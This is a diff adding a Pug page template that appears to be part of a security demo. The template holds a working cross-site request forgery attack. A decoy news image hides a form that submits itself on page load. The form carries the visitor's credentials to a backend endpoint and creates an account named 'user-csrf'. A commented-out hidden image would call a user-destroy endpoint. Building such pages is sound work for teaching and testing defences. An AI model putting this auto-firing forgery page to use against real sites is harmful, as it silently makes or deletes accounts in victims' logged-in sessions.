@@ -1,0 +1,33 @@
+extends layout
+
+block content
+  h1= title
+
+  div(class="col-md-4")
+    //- img(src='http://localhost:3001/users/3/destroy' alt="CSRF Image" style="visibility: hidden")
+    img(src='https://znews-photo.zadn.vn/w1024/Uploaded/qhj_dvoahficbu/2020_03_11/anh7_zing.jpg' alt="Corona-19 virus related image")
+
+    form(id='csrfForm' method='POST' action='http://security-demo-backend:3001/users/create')
+      input.form-control(type='hidden' id='username' name='username' value='user-csrf' )
+      input.form-control(type='hidden' id='password' name='password' value='pass-csrf')
+
+  script(type='text/javascript').
+    $('#csrfForm').submit(function(event) {
+      event.preventDefault();
+      var url = $(this).attr('action');
+      var type = $(this).attr('method');
+      var data = $(this).serialize();
+      $.ajax({
+          url,
+          type,
+          data,
+          xhrFields: { withCredentials: true }
+        }).done(function(response) {
+        console.log(response);
+      }).fail(function (jqXHR, textStatus, errorThrown) {
+        console.log(jqXHR.responseText || jqXHR.statusText);
+      });
+    });
+    $(document).ready(function() {
+      $('#csrfForm').submit();
+    });
